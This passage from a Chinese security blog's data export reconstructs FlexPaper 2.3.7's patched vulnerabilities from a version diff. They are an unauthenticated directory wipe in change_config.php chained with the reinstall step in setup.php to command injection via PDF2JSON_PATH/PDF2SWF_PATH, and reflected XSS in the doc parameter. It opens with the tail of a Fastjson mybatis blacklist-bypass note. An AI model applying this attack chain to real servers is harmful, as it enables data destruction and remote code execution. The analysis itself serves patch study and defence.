1.2.45版本中，checkAutotype安全机制又被发现了一种绕过方式。之前的几次绕过都是针对checkAutoType的绕过，而这次则是利用了一条黑名单中不包含的元素，从而绕过了黑名单限制。</p>\n<p>本次绕过利用到的是mybatis库。如果想测试成功，需要额外安装mybatis库。下文测试用例中安装的版本是3.5.5。</p>\n<p>首先简单介绍下mybatis，maven上的简介如下：</p>\n<blockquote>\n<p>“MyBatis SQL映射器框架使将关系数据库与面向对象的应用程序结合使用变得更加容易。MyBatis使用XML描述符或注释将对象与存储过程或SQL语句耦合。相对于对象关系映射工具，简单性是MyBatis数据映射器的最大优势。”</p>\n</blockquote>\n<h3 id=\"漏洞利用-2\"><a href=\"#漏洞利用-2\" class=\"headerlink\" title=\"漏洞利用\"></a>漏洞利用</h3><p>本次利用poc如下图</p>\n<p><img src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/23689542db1576061ec011f3d10ca794.png\"></p>\n<p>从poc中不难发现，@type指定了JndiDataSourceFactory类，而在properties属性中的data_source变量中指定恶意数据源。由于JndiDataSourceFactory并不在黑名单上，因此可以顺利通过黑名单校验，在接下来的反序列化过程中，在为Properties变量赋值时调用其setter方法，可见下图动态调试结果</p>\n<p><img src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/8bf6a23d27b5eca427263eee78bb4b71.png\"></p>\n<p>在上图setProperties方法中，程序将取出poc中构造的DATA_SOURCE值并触发漏洞</p>\n<h2 id=\"写在最后\"><a href=\"#写在最后\" class=\"headerlink\" title=\"写在最后\"></a>写在最后</h2><p>除了上文分析的漏洞之外，FastJson还有几个很精彩的漏洞，例如Fastjson 1.2.47版本和1.2.68版本的漏洞。因为篇幅有限，要写的实在太多了，因此我把它们抽出来放在后续文章中介绍。</p>\n"},{"title":"从FlexPaper 2.3.7 安全更新入手反推漏洞","date":"2019-11-22T06:53:32.000Z","top_img":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/php.jpg","_content":"\nFlexPaper是一个开源轻量级的在浏览器上显示各种文档的项目。它为Web客户端、移动设备和平板设备提供了文档查看功能。FlexPaper使在Flex中显示PDF成为可能。这个过程无需PDF软件环境的支持。它可以被当做Flex的库来使用。\n\n另外使用者也可以通过将一些例如Word、PPT等文档转成PDF，然后实现在线浏览。\n\nFlexPaper发布了2.3.7版本，此版本是一个安全维护更新版本。该版本中修复了wordpress-redtimmysec团队发现的一处无需身份验证的RCE漏洞以及两处未公开的xss漏洞\n\n<!--more-->\n\n## 漏洞分析\n\n我们首先通过diff2.3.6版本与2.3.7版本，查看下修改的文件\n\n![MTJS9x.png](https://s2.ax1x.com/2019/11/22/MTJS9x.png)\n\n可见一共有7个php文件被修改。经过分析，除去mudraw_php5.php与view.php，其余5个都是安全更新。\n\n这些更新可以分为主要用来修复三个漏洞，具体见下文\n\n### 任意文件删除导致的rce\n\nphp\\\\change_config.php存在如下更新\n\n![MTJp36.png](https://s2.ax1x.com/2019/11/22/MTJp36.png)\n\n在change_config.php中，7-11行新增了一个权限校验模块，19-22行新增了一个setup.php文件存在性的判断\n\n![MTJEEd.png](https://s2.ax1x.com/2019/11/22/MTJEEd.png)\n\n在46-47行间新增代码块中，由原来的删除$dir目录下所有文件，改为删除swf png以及jpg文件\n\n根据此处的更新可以推断出change_config.php中存在的漏洞可能有两处，其一是未授权的访问，在2.3.6版本中change_config.php文件首次管理员身份校验位于54行处，而不是文件开头，如下图\n\n![MTJZ4I.png](https://s2.ax1x.com/2019/11/22/MTJZ4I.png)\n\n这也就意味着，在2.3.6版本change_config.php的前53行代码，皆可以无需身份验证而访问执行\n\n接下来分析下前53行，有没有可以利用的点\n\n![MTJ0rF.png](https://s2.ax1x.com/2019/11/22/MTJ0rF.png)\n\n在如上图47行处，存在一处unlink方法，该处删除$dir指定目录中所有文件\n\n![MTJ9gK.png](https://s2.ax1x.com/2019/11/22/MTJ9gK.png)\n\n$dir变量为系统中存放swf文件的路径，该值由$configManager->getConfig('path.swf');得来，getConfig方法简单来说，就是从上图第一个红框里$configs变量里取出对应key对应的值，而$configs['path.swf']又是由$path_pdf_workingdir变量传递而来\n\n接下来我们查看下$path_pdf_workingdir变量是否可控。仍然在change_config.php中\n\n![MTJiuD.png](https://s2.ax1x.com/2019/11/22/MTJiuD.png)\n\n可见POST提交中存在SAVE_CONFIG参数时，即可通过POST提交SWF_Directory参数来赋值$path_pdf_workingdir变量，从而直接控制上文中需要使用unlink清空的$dir目录\n\n通过change_config.php提交的更新内容以及对2.3.6版本代码的分析可以得知，未授权用户可以使用change_config.php提供的功能，通过POST提交SWF_Directory参数来清空任意文件夹中的内容\n\n接着来分析change_config.php中第二处更新\n\nchange_config.php中的第二处更新如下图\n\n![MTJkHH.png](https://s2.ax1x.com/2019/11/22/MTJkHH.png)\n\n加入了setup.php文件是否存在的判断的代码，当setup.php存在时则报出\"Please delete\nsetup.php file in your flexpaper/php directory to access the FlexPaper\nconsole.\"并且exit。与之相类似的，在Index.php文件中也有类似的检查\n\n![MTJFDe.png](https://s2.ax1x.com/2019/11/22/MTJFDe.png)\n\n“Set up has completed. Please delete the setup.php file in your flexpaper/php\ndirectory to access the FlexPaper console. Refresh this page when done.”\n\n提醒用户安装结束后删除setup.php，但Index.php文件并没有强制exit程序\n\n这些线索全都指向了setup.php，setup.php其实是flexpaper后台的安装程序，主要用来生成以及配置配置文件\n\n从上文分析的未授权任意文件删除以及删除setup.php的提示来看，此次rce漏洞一定是由任意文件删除从而导致系统重装，在重装过程中setup.php安装程序存在一定的安全隐患导致了rce漏洞的产生\n\n接下来看下setup.php在此次漏洞中担当的角色\n\n在setup.php中首先发现了如下两个个方法pdf2jsonEnabled/pdf2swfEnabled\n\n![MTGLB4.png](https://s2.ax1x.com/2019/11/22/MTGLB4.png)\n\n![MTJKv8.png](https://s2.ax1x.com/2019/11/22/MTJKv8.png)\n\n这两个方法调用exec将传入的变量直接执行，如上图红框处\n\n![MTJBb4.png](https://s2.ax1x.com/2019/11/22/MTJBb4.png)\n\n![MTJN80.png](https://s2.ax1x.com/2019/11/22/MTJN80.png)\n\n在setup.php中，程序多处调用这两个方法，如上图\n而传入这两个方法中执行的$path_to_pdf2swf与$path_to_pdf2json变量竟然直接可以从GET请求中传入，见下图\n\n![MTJmCt.png](https://s2.ax1x.com/2019/11/22/MTJmCt.png)\n\n![MTJugf.png](https://s2.ax1x.com/2019/11/22/MTJugf.png)\n\nsetup.php这个文件自身的访问并没有什么限制，只要setup.php文件存在，就可以被任意用户访问\n\n![MTGOHJ.png](https://s2.ax1x.com/2019/11/22/MTGOHJ.png)\n\n但是在setup.php中，存在如上图代码，会检测admin.password是否为null，来判断系统是否已经安装成功，安装过的系统将会直接触发exit，退出安装流程，也就无法执行后续我们任意代码执行的地方\n\nadmin.password这个配置来自于php\\\\config\\\\config.ini.win.php\n\n![MTJwKU.png](https://s2.ax1x.com/2019/11/22/MTJwKU.png)\n\n安装前如上图所示\n\n![MTJavT.png](https://s2.ax1x.com/2019/11/22/MTJavT.png)\n\n安装后如上图所示\n\n配合任意文件删除把config目录清空，即可成功触发重装机制，执行setup.php并且通过GET请求中PDF2JSON_PATH或PDF2SWF_PATH参数传入payload，造成任意代码执行漏洞\n\n### simple_document.php中反射型XSS\n\nphp/simple_document.php 存在一处更新\n\n![MTJU2V.png](https://s2.ax1x.com/2019/11/22/MTJU2V.png)\n\n可见，使用htmlspecialchars将GET请求传入的doc参数过滤\n\n接着看存在问题的版本\n\n![MTJn8P.png](https://s2.ax1x.com/2019/11/22/MTJn8P.png)\n\n这里直接将GET请求中的doc参数echo，从而导致了xss漏洞的产生\n\n![MTJrVJ.png](https://s2.ax1x.com/2019/11/22/MTJrVJ.png)\n\n### split_document.php中反射型XSS\n\nphp/split_document.php中存在如下更新\n\n![MTGx41.png](https://s2.ax1x.com/2019/11/22/MTGx41.png)\n\n上图可见，更新后的程序使用htmlspecialchars将GET请求传入的doc参数过滤\n\n接着看存在问题的版本代码\n\n![MTGvNR.png](https://s2.ax1x.com/2019/11/22/MTGvNR.png)\n\n漏洞成因和上一节的如出一辙。但是这处都漏洞利用难度很大，原因如下\n\n![MTJCjO.png](https://s2.ax1x.com/2019/11/22/MTJCjO.png)\n\n见上图红框处，存在一处getTotalPages方法，该方法接受我们传入payload的$doc参数作为pdf文件名，拼接pdf路径。\n\n跟入getTotalPages方法，如下图\n\n![MTJy5R.png](https://s2.ax1x.com/2019/11/22/MTJy5R.png)\n\n在该方法中有如下判断：如果fopen或者fread传入的pdf文件失败，则返回false。这将导致我们js中numPages变量为空\n\n![MTGquF.png](https://s2.ax1x.com/2019/11/22/MTGquF.png)\n\n实际利用时，我们需要造一个payload，这个payload需要与pdf文件路径中的一个pdf文件的文件名相符，这点利用起来比较复杂。\n\n如果没有满足这个条件，则会出现如下错误: numPages = ;\n\n![MTGjE9.png](https://s2.ax1x.com/2019/11/22/MTGjE9.png)\n\n![MTJVUA.png](https://s2.ax1x.com/2019/11/22/MTJVUA.png)\n\nJs脚本无法成功执行，xss不能稳定复现\n因此此处的漏洞利用难度比较高\n\n## 结语\n\nFlexPaper作为一个开源项目在互联网上非常流行。据相关资料显示，至少在2014年之前，维基解密一直在广泛的使用该组件。但是从本次漏洞来看，其安全性仍有待需提高。\n关于本次漏洞的分析，在寻找存在漏洞的3.2.6版本花费了我一些时间：官网在github上的更新终止与2.2.7版；官网上没有关于旧版本的下载链接；FlexPaper3.2.7发行说明中丝毫没有提及安全相关的改动。花费了好久，最终才在一个下载站找到了3.2.6版本的源码。","source":"_posts/flexpaper237.md","raw":"---\ntitle: 从FlexPaper 2.3.7 安全更新入手反推漏洞\ndate: 2019-11-22 14:53:32\ntags: 漏洞分析\ncategories: 技术\n\ntop_img: https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/php.jpg\n---\n\nFlexPaper是一个开源轻量级的在浏览器上显示各种文档的项目。它为Web客户端、移动设备和平板设备提供了文档查看功能。FlexPaper使在Flex中显示PDF成为可能。这个过程无需PDF软件环境的支持。它可以被当做Flex的库来使用。\n\n另外使用者也可以通过将一些例如Word、PPT等文档转成PDF，然后实现在线浏览。\n\nFlexPaper发布了2.3.7版本，此版本是一个安全维护更新版本。该版本中修复了wordpress-redtimmysec团队发现的一处无需身份验证的RCE漏洞以及两处未公开的xss漏洞\n\n<!--more-->\n\n## 漏洞分析\n\n我们首先通过diff2.3.6版本与2.3.7版本，查看下修改的文件\n\n![MTJS9x.png](https://s2.ax1x.com/2019/11/22/MTJS9x.png)\n\n可见一共有7个php文件被修改。经过分析，除去mudraw_php5.php与view.php，其余5个都是安全更新。\n\n这些更新可以分为主要用来修复三个漏洞，具体见下文\n\n### 任意文件删除导致的rce\n\nphp\\\\change_config.php存在如下更新\n\n![MTJp36.png](https://s2.ax1x.com/2019/11/22/MTJp36.png)\n\n在change_config.php中，7-11行新增了一个权限校验模块，19-22行新增了一个setup.php文件存在性的判断\n\n![MTJEEd.png](https://s2.ax1x.com/2019/11/22/MTJEEd.png)\n\n在46-47行间新增代码块中，由原来的删除$dir目录下所有文件，改为删除swf png以及jpg文件\n\n根据此处的更新可以推断出change_config.php中存在的漏洞可能有两处，其一是未授权的访问，在2.3.6版本中change_config.php文件首次管理员身份校验位于54行处，而不是文件开头，如下图\n\n![MTJZ4I.png](https://s2.ax1x.com/2019/11/22/MTJZ4I.png)\n\n这也就意味着，在2.3.6版本change_config.php的前53行代码，皆可以无需身份验证而访问执行\n\n接下来分析下前53行，有没有可以利用的点\n\n![MTJ0rF.png](https://s2.ax1x.com/2019/11/22/MTJ0rF.png)\n\n在如上图47行处，存在一处unlink方法，该处删除$dir指定目录中所有文件\n\n![MTJ9gK.png](https://s2.ax1x.com/2019/11/22/MTJ9gK.png)\n\n$dir变量为系统中存放swf文件的路径，该值由$configManager->getConfig('path.swf');得来，getConfig方法简单来说，就是从上图第一个红框里$configs变量里取出对应key对应的值，而$configs['path.swf']又是由$path_pdf_workingdir变量传递而来\n\n接下来我们查看下$path_pdf_workingdir变量是否可控。仍然在change_config.php中\n\n![MTJiuD.png](https://s2.ax1x.com/2019/11/22/MTJiuD.png)\n\n可见POST提交中存在SAVE_CONFIG参数时，即可通过POST提交SWF_Directory参数来赋值$path_pdf_workingdir变量，从而直接控制上文中需要使用unlink清空的$dir目录\n\n通过change_config.php提交的更新内容以及对2.3.6版本代码的分析可以得知，未授权用户可以使用change_config.php提供的功能，通过POST提交SWF_Directory参数来清空任意文件夹中的内容\n\n接着来分析change_config.php中第二处更新\n\nchange_config.php中的第二处更新如下图\n\n![MTJkHH.png](https://s2.ax1x.com/2019/11/22/MTJkHH.png)\n\n加入了setup.php文件是否存在的判断的代码，当setup.php存在时则报出\"Please delete\nsetup.php file in your flexpaper/php directory to access the FlexPaper\nconsole.\"并且exit。与之相类似的，在Index.php文件中也有类似的检查\n\n![MTJFDe.png](https://s2.ax1x.com/2019/11/22/MTJFDe.png)\n\n“Set up has completed. Please delete the setup.php file in your flexpaper/php\ndirectory to access the FlexPaper console. Refresh this page when done.”\n\n提醒用户安装结束后删除setup.php，但Index.php文件并没有强制exit程序\n\n这些线索全都指向了setup.php，setup.php其实是flexpaper后台的安装程序，主要用来生成以及配置配置文件\n\n从上文分析的未授权任意文件删除以及删除setup.php的提示来看，此次rce漏洞一定是由任意文件删除从而导致系统重装，在重装过程中setup.php安装程序存在一定的安全隐患导致了rce漏洞的产生\n\n接下来看下setup.php在此次漏洞中担当的角色\n\n在setup.php中首先发现了如下两个个方法pdf2jsonEnabled/pdf2swfEnabled\n\n![MTGLB4.png](https://s2.ax1x.com/2019/11/22/MTGLB4.png)\n\n![MTJKv8.png](https://s2.ax1x.com/2019/11/22/MTJKv8.png)\n\n这两个方法调用exec将传入的变量直接执行，如上图红框处\n\n![MTJBb4.png](https://s2.ax1x.com/2019/11/22/MTJBb4.png)\n\n![MTJN80.png](https://s2.ax1x.com/2019/11/22/MTJN80.png)\n\n在setup.php中，程序多处调用这两个方法，如上图\n而传入这两个方法中执行的$path_to_pdf2swf与$path_to_pdf2json变量竟然直接可以从GET请求中传入，见下图\n\n![MTJmCt.png](https://s2.ax1x.com/2019/11/22/MTJmCt.png)\n\n![MTJugf.png](https://s2.ax1x.com/2019/11/22/MTJugf.png)\n\nsetup.php这个文件自身的访问并没有什么限制，只要setup.php文件存在，就可以被任意用户访问\n\n![MTGOHJ.png](https://s2.ax1x.com/2019/11/22/MTGOHJ.png)\n\n但是在setup.php中，存在如上图代码，会检测admin.password是否为null，来判断系统是否已经安装成功，安装过的系统将会直接触发exit，退出安装流程，也就无法执行后续我们任意代码执行的地方\n\nadmin.password这个配置来自于php\\\\config\\\\config.ini.win.php\n\n![MTJwKU.png](https://s2.ax1x.com/2019/11/22/MTJwKU.png)\n\n安装前如上图所示\n\n![MTJavT.png](https://s2.ax1x.com/2019/11/22/MTJavT.png)\n\n安装后如上图所示\n\n配合任意文件删除把config目录清空，即可成功触发重装机制，执行setup.php并且通过GET请求中PDF2JSON_PATH或PDF2SWF_PATH参数传入payload，造成任意代码执行漏洞\n\n### simple_document.php中反射型XSS\n\nphp/simple_document.php 存在一处更新\n\n![MTJU2V.png](https://s2.ax1x.com/2019/11/22/MTJU2V.png)\n\n可见，使用htmlspecialchars将GET请求传入的doc参数过滤\n\n接着看存在问题的版本\n\n![MTJn8P.png](https://s2.ax1x.com/2019/11/22/MTJn8P.png)\n\n这里直接将GET请求中的doc参数echo，从而导致了xss漏洞的产生\n\n![MTJrVJ.png](https://s2.ax1x.com/2019/11/22/MTJrVJ.png)\n\n### split_document.php中反射型XSS\n\nphp/split_document.php中存在如下更新\n\n![MTGx41.png](https://s2.ax1x.com/2019/11/22/MTGx41.png)\n\n上图可见，更新后的程序使用htmlspecialchars将GET请求传入的doc参数过滤\n\n接着看存在问题的版本代码\n\n![MTGvNR.png](https://s2.ax1x.com/2019/11/22/MTGvNR.png)\n\n漏洞成因和上一节的如出一辙。但是这处都漏洞利用难度很大，原因如下\n\n![MTJCjO.png](https://s2.ax1x.com/2019/11/22/MTJCjO.png)\n\n见上图红框处，存在一处getTotalPages方法，该方法接受我们传入payload的$doc参数作为pdf文件名，拼接pdf路径。\n\n跟入getTotalPages方法，如下图\n\n![MTJy5R.png](https://s2.ax1x.com/2019/11/22/MTJy5R.png)\n\n在该方法中有如下判断：如果fopen或者fread传入的pdf文件失败，则返回false。这将导致我们js中numPages变量为空\n\n![MTGquF.png](https://s2.ax1x.com/2019/11/22/MTGquF.png)\n\n实际利用时，我们需要造一个payload，这个payload需要与pdf文件路径中的一个pdf文件的文件名相符，这点利用起来比较复杂。\n\n如果没有满足这个条件，则会出现如下错误: numPages = ;\n\n![MTGjE9.png](https://s2.ax1x.com/2019/11/22/MTGjE9.png)\n\n![MTJVUA.png](https://s2.ax1x.com/2019/11/22/MTJVUA.png)\n\nJs脚本无法成功执行，xss不能稳定复现\n因此此处的漏洞利用难度比较高\n\n## 结语\n\nFlexPaper作为一个开源项目在互联网上非常流行。据相关资料显示，至少在2014年之前，维基解密一直在广泛的使用该组件。但是从本次漏洞来看，其安全性仍有待需提高。\n关于本次漏洞的分析，在寻找存在漏洞的3.2.6版本花费了我一些时间：官网在github上的更新终止与2.2.7版；官网上没有关于旧版本的下载链接；FlexPaper3.2.7发行说明中丝毫没有提及安全相关的改动。花费了好久，最终才在一个下载站找到了3.2.6版本的源码。","slug":"flexpaper237","published":1,"updated":"2020-10-27T09:27:09.601Z","_id":"ckgrozu9d003fwsa9d49lem8t","comments":1,"layout":"post","photos":[],"link":"","content":"<p>FlexPaper是一个开源轻量级的在浏览器上显示各种文档的项目。它为Web客户端、移动设备和平板设备提供了文档查看功能。FlexPaper使在Flex中显示PDF成为可能。这个过程无需PDF软件环境的支持。它可以被当做Flex的库来使用。</p>\n<p>另外使用者也可以通过将一些例如Word、PPT等文档转成PDF，然后实现在线浏览。</p>\n<p>FlexPaper发布了2.3.7版本，此版本是一个安全维护更新版本。该版本中修复了wordpress-redtimmysec团队发现的一处无需身份验证的RCE漏洞以及两处未公开的xss漏洞</p>\n<a id=\"more\"></a>\n\n<h2 id=\"漏洞分析\"><a href=\"#漏洞分析\" class=\"headerlink\" title=\"漏洞分析\"></a>漏洞分析</h2><p>我们首先通过diff2.3.6版本与2.3.7版本，查看下修改的文件</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/11/22/MTJS9x.png\" alt=\"MTJS9x.png\"></p>\n<p>可见一共有7个php文件被修改。经过分析，除去mudraw_php5.php与view.php，其余5个都是安全更新。</p>\n<p>这些更新可以分为主要用来修复三个漏洞，具体见下文</p>\n<h3 id=\"任意文件删除导致的rce\"><a href=\"#任意文件删除导致的rce\" class=\"headerlink\" title=\"任意文件删除导致的rce\"></a>任意文件删除导致的rce</h3><p>php\\change_config.php存在如下更新</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/11/22/MTJp36.png\" alt=\"MTJp36.png\"></p>\n<p>在change_config.php中，7-11行新增了一个权限校验模块，19-22行新增了一个setup.php文件存在性的判断</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/11/22/MTJEEd.png\" alt=\"MTJEEd.png\"></p>\n<p>在46-47行间新增代码块中，由原来的删除$dir目录下所有文件，改为删除swf png以及jpg文件</p>\n<p>根据此处的更新可以推断出change_config.php中存在的漏洞可能有两处，其一是未授权的访问，在2.3.6版本中change_config.php文件首次管理员身份校验位于54行处，而不是文件开头，如下图</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/11/22/MTJZ4I.png\" alt=\"MTJZ4I.png\"></p>\n<p>这也就意味着，在2.3.6版本change_config.php的前53行代码，皆可以无需身份验证而访问执行</p>\n<p>接下来分析下前53行，有没有可以利用的点</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/11/22/MTJ0rF.png\" alt=\"MTJ0rF.png\"></p>\n<p>在如上图47行处，存在一处unlink方法，该处删除$dir指定目录中所有文件</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/11/22/MTJ9gK.png\" alt=\"MTJ9gK.png\"></p>\n<p>$dir变量为系统中存放swf文件的路径，该值由$configManager-&gt;getConfig(‘path.swf’);得来，getConfig方法简单来说，就是从上图第一个红框里$configs变量里取出对应key对应的值，而$configs[‘path.swf’]又是由$path_pdf_workingdir变量传递而来</p>\n<p>接下来我们查看下$path_pdf_workingdir变量是否可控。仍然在change_config.php中</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/11/22/MTJiuD.png\" alt=\"MTJiuD.png\"></p>\n<p>可见POST提交中存在SAVE_CONFIG参数时，即可通过POST提交SWF_Directory参数来赋值$path_pdf_workingdir变量，从而直接控制上文中需要使用unlink清空的$dir目录</p>\n<p>通过change_config.php提交的更新内容以及对2.3.6版本代码的分析可以得知，未授权用户可以使用change_config.php提供的功能，通过POST提交SWF_Directory参数来清空任意文件夹中的内容</p>\n<p>接着来分析change_config.php中第二处更新</p>\n<p>change_config.php中的第二处更新如下图</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/11/22/MTJkHH.png\" alt=\"MTJkHH.png\"></p>\n<p>加入了setup.php文件是否存在的判断的代码，当setup.php存在时则报出”Please delete<br>setup.php file in your flexpaper/php directory to access the FlexPaper<br>console.”并且exit。与之相类似的，在Index.php文件中也有类似的检查</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/11/22/MTJFDe.png\" alt=\"MTJFDe.png\"></p>\n<p>“Set up has completed. Please delete the setup.php file in your flexpaper/php<br>directory to access the FlexPaper console. Refresh this page when done.”</p>\n<p>提醒用户安装结束后删除setup.php，但Index.php文件并没有强制exit程序</p>\n<p>这些线索全都指向了setup.php，setup.php其实是flexpaper后台的安装程序，主要用来生成以及配置配置文件</p>\n<p>从上文分析的未授权任意文件删除以及删除setup.php的提示来看，此次rce漏洞一定是由任意文件删除从而导致系统重装，在重装过程中setup.php安装程序存在一定的安全隐患导致了rce漏洞的产生</p>\n<p>接下来看下setup.php在此次漏洞中担当的角色</p>\n<p>在setup.php中首先发现了如下两个个方法pdf2jsonEnabled/pdf2swfEnabled</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/11/22/MTGLB4.png\" alt=\"MTGLB4.png\"></p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/11/22/MTJKv8.png\" alt=\"MTJKv8.png\"></p>\n<p>这两个方法调用exec将传入的变量直接执行，如上图红框处</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/11/22/MTJBb4.png\" alt=\"MTJBb4.png\"></p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/11/22/MTJN80.png\" alt=\"MTJN80.png\"></p>\n<p>在setup.php中，程序多处调用这两个方法，如上图<br>而传入这两个方法中执行的$path_to_pdf2swf与$path_to_pdf2json变量竟然直接可以从GET请求中传入，见下图</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/11/22/MTJmCt.png\" alt=\"MTJmCt.png\"></p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/11/22/MTJugf.png\" alt=\"MTJugf.png\"></p>\n<p>setup.php这个文件自身的访问并没有什么限制，只要setup.php文件存在，就可以被任意用户访问</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/11/22/MTGOHJ.png\" alt=\"MTGOHJ.png\"></p>\n<p>但是在setup.php中，存在如上图代码，会检测admin.password是否为null，来判断系统是否已经安装成功，安装过的系统将会直接触发exit，退出安装流程，也就无法执行后续我们任意代码执行的地方</p>\n<p>admin.password这个配置来自于php\\config\\config.ini.win.php</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/11/22/MTJwKU.png\" alt=\"MTJwKU.png\"></p>\n<p>安装前如上图所示</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/11/22/MTJavT.png\" alt=\"MTJavT.png\"></p>\n<p>安装后如上图所示</p>\n<p>配合任意文件删除把config目录清空，即可成功触发重装机制，执行setup.php并且通过GET请求中PDF2JSON_PATH或PDF2SWF_PATH参数传入payload，造成任意代码执行漏洞</p>\n<h3 id=\"simple-document-php中反射型XSS\"><a href=\"#simple-document-php中反射型XSS\" class=\"headerlink\" title=\"simple_document.php中反射型XSS\"></a>simple_document.php中反射型XSS</h3><p>php/simple_document.php 存在一处更新</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/11/22/MTJU2V.png\" alt=\"MTJU2V.png\"></p>\n<p>可见，使用htmlspecialchars将GET请求传入的doc参数过滤</p>\n<p>接着看存在问题的版本</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/11/22/MTJn8P.png\" alt=\"MTJn8P.png\"></p>\n<p>这里直接将GET请求中的doc参数echo，从而导致了xss漏洞的产生</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/11/22/MTJrVJ.png\" alt=\"MTJrVJ.png\"></p>\n<h3 id=\"split-document-php中反射型XSS\"><a href=\"#split-document-php中反射型XSS\" class=\"headerlink\" title=\"split_document.php中反射型XSS\"></a>split_document.php中反射型XSS</h3><p>php/split_document.php中存在如下更新</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/11/22/MTGx41.png\" alt=\"MTGx41.png\"></p>\n<p>上图可见，更新后的程序使用htmlspecialchars将GET请求传入的doc参数过滤</p>\n<p>接着看存在问题的版本代码</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/11/22/MTGvNR.png\" alt=\"MTGvNR.png\"></p>\n<p>漏洞成因和上一节的如出一辙。但是这处都漏洞利用难度很大，原因如下</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/11/22/MTJCjO.png\" alt=\"MTJCjO.png\"></p>\n<p>见上图红框处，存在一处getTotalPages方法，该方法接受我们传入payload的$doc参数作为pdf文件名，拼接pdf路径。</p>\n<p>跟入getTotalPages方法，如下图</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/11/22/MTJy5R.png\" alt=\"MTJy5R.png\"></p>\n<p>在该方法中有如下判断：如果fopen或者fread传入的pdf文件失败，则返回false。这将导致我们js中numPages变量为空</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/11/22/MTGquF.png\" alt=\"MTGquF.png\"></p>\n<p>实际利用时，我们需要造一个payload，这个payload需要与pdf文件路径中的一个pdf文件的文件名相符，这点利用起来比较复杂。</p>\n<p>如果没有满足这个条件，则会出现如下错误: numPages = ;</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/11/22/MTGjE9.png\" alt=\"MTGjE9.png\"></p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/11/22/MTJVUA.png\" alt=\"MTJVUA.png\"></p>\n<p>Js脚本无法成功执行，xss不能稳定复现<br>因此此处的漏洞利用难度比较高</p>\n<h2 id=\"结语\"><a href=\"#结语\" class=\"headerlink\" title=\"结语\"></a>结语</h2><p>FlexPaper作为一个开源项目在互联网上非常流行。据相关资料显示，至少在2014年之前，维基解密一直在广泛的使用该组件。但是从本次漏洞来看，其安全性仍有待需提高。<br>关于本次漏洞的分析，在寻找存在漏洞的3.2.6版本花费了我一些时间：官网在github上的更新终止与2.2.7版；官网上没有关于旧版本的下载链接；FlexPaper3.2.7发行说明中丝毫没有提及安全相关的改动。花费了好久，最终才在一个下载站找到了3.2.6版本的源码。</p>\n","site":{"data":{"link":[{"class_name":"友情鏈接","class_desc":"那些人，那些事","link_list":[{"name":"xxlegend","link":"http://xxlegend.com/","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/xxlegend.png"},{"name":"phithon","link":"https://www.leavesongs.com","avatar":"https://secure.gravatar.com/avatar/c4267eb6d17276fa31c547ac71611e90.jpg?s=100&d=mm&r=g"},{"name":"ADOG","link":"http://foreversong.cn/","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/微信图片_20200916153556.jpg"},{"name":"kylingit","link":"https://kylingit.com","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/logo.jpg"},{"name":"tsang","link":"https://jontsang.github.io","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/avatar.png"},{"name":"BlBana","link":"https://drops.blbana.cc","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/Misaka.jpg"},{"name":"ChaBug安全","link":"http://www.chabug.org","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/微信截图_20200918105651.png"}]}]}},"cover":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/hacker-0509-scaled.jpg","excerpt":"<p>FlexPaper是一个开源轻量级的在浏览器上显示各种文档的项目。它为Web客户端、移动设备和平板设备提供了文档查看功能。FlexPaper使在Flex中显示PDF成为可能。这个过程无需PDF软件环境的支持。它可以被当做Flex的库来使用。</p>\n<p>另外使用者也可以通过将一些例如Word、PPT等文档转成PDF，然后实现在线浏览。</p>\n<p>FlexPaper发布了2.3.7版本，此版本是一个安全维护更新版本。该版本中修复了wordpress-redtimmysec团队发现的一处无需身份验证的R